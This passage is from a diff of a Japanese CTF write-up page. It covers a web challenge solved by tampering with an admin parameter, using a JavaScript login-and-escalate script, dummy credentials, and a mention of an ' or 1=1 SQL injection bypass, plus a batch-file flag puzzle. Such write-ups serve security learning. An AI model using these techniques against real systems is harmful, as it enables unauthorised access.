++-----+----------+--------------------+-------------+---------+
+| 1   | mikawa01 | Ieyasu Tokugawa    | ndJs83GD    | No flag |
+| 2   | nagoya01 | Hideyoshi Toyotomi | jNfo0Opopl  | No flag |
+| 3   | sendai01 | Masamune Date      | knDhys98hTh | No flag |
+| 4   | owari01  | Nobunaga Oda       | knDdd98hTh  | No flag |
++-----+----------+--------------------+-------------+---------+
+</code></pre><p>ここから適当に一つ選んでログインしてみました。<br>
+ログインに成功するとユーザ情報を表示するページに飛びます。<br>
+そこにはフラグを表示というボタンがあるのですが、フラグは管理者にしか表示されませんと言われてしまい、フラグを取り出せません。<br>
+ボタンを押した際に送信されるリクエストを見てみると以下のようなものでした。</p>
+<pre tabindex="0"><code>POST /flag.php
+Content-Type: application/x-www-form-urlencoded
+Cookie: ユーザのセッション
+
+admin=0
+</code></pre><p>adminの値を1にすればいけるのではと思いやってみたところ、アドミンアカウントとして認識してくれました。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://pw2-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">credentials</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;name=mikawa01&amp;password=ndJs83GD&amp;pass-re=ndJs83GD&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;auth.php&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">redirect</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;manual&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">credentials</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">getSetCookie</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">session</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Cookie&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">redirect</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;manual&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin=1&#34;</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>実は他の方のwriteupを見てみると、普通に&rsquo; or 1=1のような簡単なペイロードで認証を突破していました。<br>
+わざわざクレデンシャルを抜き出さなくてもよかったですね。</p>
+<pre tabindex="0"><code>flag{DoNotUseParameter2Auth}
+</code></pre><h2 id="tr">TR</h2>
+<h3 id="windowsで解きましょう">Windowsで解きましょう</h3>
+<p>フラグを生成するbatファイルが渡されます。<br>
+その中にはいくつかダミーのファイルも生成されるようになっています。<br>
+本物にだけはある目印を付けているとのことでした。<br>
+以下がそのbatファイルになります。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bat" data-lang="bat"><span style="display:flex;"><span>@<span style="color:#66d9ef">echo</span> off
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">setlocal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA1=23
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA2=61
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA3=34
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA4=25
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA5=75
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA6=64
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA7=93
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA8=44
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> FDATA9=72
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">md</span> flags
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">chdir</span> flags
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#66d9ef">/l</span> <span style="color:#ae81ff">%%</span>n <span style="color:#66d9ef">in</span> (<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">99</span>) <span style="color:#66d9ef">do</span> (
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">type</span> null &gt; flags_<span style="color:#ae81ff">%%</span>n.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> flag{%FDATA5%%FDATA4%<span style="color:#ae81ff">%%</span>n%FDATA1%%FDATA6%%FDATA2%<span style="color:#ae81ff">%%</span>n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} &gt; flags_<span style="color:#ae81ff">%%</span>n.txt
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">%%</span>n<span style="color:#f92672">==</span>%FDATA4% <span style="color:#66d9ef">echo</span> &gt; flags_<span style="color:#ae81ff">%%</span>n.txt:TrueFlag
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endlocal</span>
+</span></span></code></pre></div><p>最後のif文から%FDATA4%番目のファイルが本物だと分かります。<br>
+%FDATA4%は25なので、flags_25.txtの内容がフラグになります。</p>
+<pre tabindex="0"><code>flag{7525252364612534937244}
+</code></pre><h2 id="終わりに">終わりに</h2>
+<p>今回は久しぶりのCTFでしたが65位と二桁に食い込めて嬉しかったです。<br>
+Wiresharkのフィルタのかけ方を学べたり、ログファイルから攻撃コードを作成する新鮮な問題に出会えたりと新鮮なCTFでした。</p>
+
         
     </div>
 
@@ -556,6 +841,27 @@ flagSeedパラメータの値に応じて1~2の文字が返されます。<br>
         <li><a href="#chemistry">Chemistry</a></li>
       </ul>
     </li>
+    <li><a href="#we">WE</a>
+      <ul>
+        <li><a href="#簡単には見せません">簡単には見せません</a></li>
+        <li><a href="#試練を乗り越えろ">試練を乗り越えろ！</a></li>
+        <li><a href="#直してる最中なんです">直してる最中なんです</a></li>
+        <li><a href="#直接聞いてみたら">直接聞いてみたら？</a></li>
+        <li><a href="#整列">整列！</a></li>
+      </ul>
+    </li>
+    <li><a href="#pw">PW</a>
+      <ul>
+        <li><a href="#cve-2014-7169他">CVE-2014-7169他</a></li>
+        <li><a href="#認証は認可の後">認証は認可の後</a></li>
+      </ul>
+    </li>
+    <li><a href="#tr">TR</a>
+      <ul>
+        <li><a href="#windowsで解きましょう">Windowsで解きましょう</a></li>
+      </ul>
+    </li>
+    <li><a href="#終わりに">終わりに</a></li>
   </ul>
 </nav>
     </nav>
